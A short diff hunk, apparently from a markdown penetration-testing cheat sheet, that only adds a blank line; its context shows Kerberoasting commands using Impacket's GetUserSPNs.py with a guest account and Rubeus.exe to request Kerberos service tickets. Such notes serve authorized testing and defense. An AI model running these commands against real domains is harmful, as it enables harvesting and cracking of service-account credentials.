@@ -15,6 +15,7 @@ GetUserSPNs.py domain.local/guest -usersfile users.txt -request -outputfile kerb
 ```
 
 Kerberoasting (from computer on the domain):
+
 ```powershell
 .\Rubeus.exe kerberoast /nowrap
 ```
